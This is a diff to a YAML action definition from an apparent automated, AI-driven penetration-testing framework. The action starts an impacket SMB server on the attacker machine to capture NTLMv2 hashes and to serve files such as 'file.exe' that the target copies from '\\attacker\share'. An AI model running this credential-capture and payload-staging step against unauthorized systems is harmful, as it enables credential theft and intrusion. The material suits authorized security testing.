@@ -2,17 +2,20 @@ name: smb_server
 category: creds
 description: Start local SMB server for file transfer and hash capture
 preconditions:
-  - has_target
+- has_target
 parameters:
-  share_name: "share"
+  share_name: share
   share_path: from_engagement.tools_dir
-command_template: "impacket-smbserver {share_name} {share_path} -smb2support"
-parser: null
+command_template: impacket-smbserver {share_name} {share_path} -smb2support
+parser: smbclient_parser
 expected_effects:
-  - smb_server_started
-  - ntlm_hash_captured
+- smb_server_started
+- ntlm_hash_captured
 falsifier:
-  pattern: "Address already in use"
+  pattern: Address already in use
   timeout: 10
 model_tier: haiku
-mechanism: "Hosts SMB share on attacker. Target accesses via \\\\attacker_ip\\share. Captures NTLMv2 hashes from connecting clients. Also used for file transfer: copy \\\\attacker\\share\\file.exe on target. -smb2support required for modern Windows."
+mechanism: 'Hosts SMB share on attacker. Target accesses via \\attacker_ip\share.
+  Captures NTLMv2 hashes from connecting clients. Also used for file transfer: copy
+  \\attacker\share\file.exe on target. -smb2support required for modern Windows.'
+hacktricks_ref: generic-hacking/brute-force.md
